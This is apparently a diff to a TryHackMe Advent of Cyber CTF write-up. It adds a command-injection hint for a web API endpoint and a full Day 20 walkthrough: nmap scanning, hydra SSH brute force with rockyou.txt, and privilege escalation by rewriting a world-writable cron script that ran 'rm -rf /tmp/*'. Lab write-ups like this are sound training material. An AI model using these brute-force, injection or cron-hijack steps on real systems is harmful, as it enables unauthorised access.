@@ -833,7 +833,11 @@ McSkidy actually found something interesting on the /api/cmd endpoint.
 READ [this](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit)
 
 ## What are the contents of the user.txt file?
-
+We got a hit that we should check http://[your-ip]:3000/api/cmd/. I notice by the url name that it have something to do with ```cmd.exe```. So I start playing around by executing ```http://[your-ip]:3000/api/cmd/id``` and yes we found the vulnerability!! Command Injection. now try the following cmd to find the flag (hint: some where in ```/home```)
+1. cat 
+2. dir
+3. dont forget URL encoding: %20 for space %2F for slash
+GLHF
 # Day 20 : Cronjob Privilege Escalation 
 ```
 You think the evil Christmas monster is acting on Elf Sam's account!
@@ -841,11 +845,93 @@ You think the evil Christmas monster is acting on Elf Sam's account!
 Hack into her account and escalate your privileges on this Linux machine.
 ```
 ## What port is SSH running on?
+```console
+nmap -p- -A 10.10.50.118
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 22:49 EDT
+Nmap scan report for 10.10.50.118
+Host is up (0.045s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE VERSION
+4XXX/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:fc:5a:a1:06:82:37:95:35:29:03:c1:34:fa:bc:99 (RSA)
+|   256 36:e5:21:c9:83:8b:68:9d:30:bb:20:3c:6f:f7:fa:f4 (ECDSA)
+|_  256 7b:88:cc:36:a0:f5:5a:79:3b:1c:a5:a8:e9:d2:d4:0d (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 111.42 seconds
+
+```
 ## Crack sam's password and read flag1.txt
+```console
+kali@kali:~$ hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.50.118 -s 4567 -t 4 ssh # crack password with hydra
+kali@kali:~$ ssh sam@10.10.50.118 -p 4567 # ssh
+sam@10.10.50.118's password: 
+       .---.
+      /     \
+      \.@-@./
+      /`\_/`\
+     //  _  \\
+    | \     )|_
+   /`\_`>  <_/ \
+   \__/'---'\__/
+     tryhackme
+sam@ip-10-10-50-118:~$ ls
+flag1.txt
+sam@ip-10-10-50-118:~$ cat flag1.txt
+```
 
 ## Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
+after the enumeration, I found 2 insteresting files
+```console
+sam@ip-10-10-50-118:~$ ls -l /home/ubuntu/ # the flag2.txt is here, remember the ownership
+total 4
+-r-------- 1 ubuntu ubuntu 38 Dec 19 20:09 flag2.txt
+sam@ip-10-10-50-118:~$ ls /home/scripts/ # 2nd file is .sh
+clean_up.sh  test.txt
+sam@ip-10-10-50-118:~$ cat /home/scripts/clean_up.sh #it remove everything in /tmp
+rm -rf /tmp/*
+sam@ip-10-10-50-118:~$ ls -la /home/scripts/ #own by ubuntu and it seem like we have permission to rwx
+total 16
+drwxrwxrwx 2 root   root   4096 Dec 19 20:55 .
+drwxr-xr-x 5 root   root   4096 Dec 19 20:12 ..
+-rwxrwxrwx 1 ubuntu ubuntu   14 Dec 19 20:55 clean_up.sh
+-rw-r--r-- 1 root   root      5 Dec 19 20:55 test.txt
+```
+So the task is escalate our privileges by taking advantage of a cronjob... maybe the executing ```clean_up.sh``` is a part of the cronjob? let check it out
+```console
+sam@ip-10-10-50-118:~$ ls -la /tmp/ #so we can see the latest modified time
+total 28
+drwxrwxrwt  7 root root 4096 May 16 04:05 .
+drwxr-xr-x 23 root root 4096 May 16 02:44 ..
+drwxrwxrwt  2 root root 4096 May 16 02:43 .font-unix
+drwxrwxrwt  2 root root 4096 May 16 02:43 .ICE-unix
+drwxrwxrwt  2 root root 4096 May 16 02:43 .Test-unix
+drwxrwxrwt  2 root root 4096 May 16 02:43 .X11-unix
+drwxrwxrwt  2 root root 4096 May 16 02:43 .XIM-unix
+sam@ip-10-10-50-118:~$ date # current time
+Sat May 16 04:05:22 UTC 2020
+```
+Yes, the firt line show that the last access time is ```04:05``` and when executed date shows ```Sat May 16 04:05:22 UTC 2020```. The timestamp is show that **there is the cronjob running by ubuntu every minute**.
 
+
+Since the ```clean_up.sh``` is own by ubuntu which is also the owner of ```flag2.txt```. we can use ```clean_up.sh``` to escalate our privilage and get the flag. we will edit the clean_up.sh and make it cat the content of flag2.txt for us. (CAN't copy since there is only read permission on flag2.txt -> ```-r-------- 1 ubuntu ubuntu 38 Dec 19 20:09 flag2.txt```)
+```console
+sam@ip-10-10-50-118:~$ nano /home/scripts/clean_up.sh 
+```
+add this:
+```bash
+# rm -rf /tmp/*
+cat /home/ubuntu/flag2.txt > /home/sam/flag2.txt && chmod 777 /home/sam/flag2.txt
+# note that I did chmod to make sure that we will have permission to open the the flie
+```
+now just cat the flag2.txt
+```console
+sam@ip-10-10-50-118:~$ cat flag2.txt 
+THM{b27d33XXXXXXXXXXXXXXXXXXXXXXXXXX}
+GLHF
+```
 # Day 21 : Reverse Elf-ineering 
 ```
 McSkidy has never really touched low level languages - this is something they must learn in their quest to defeat the Christmas monster.
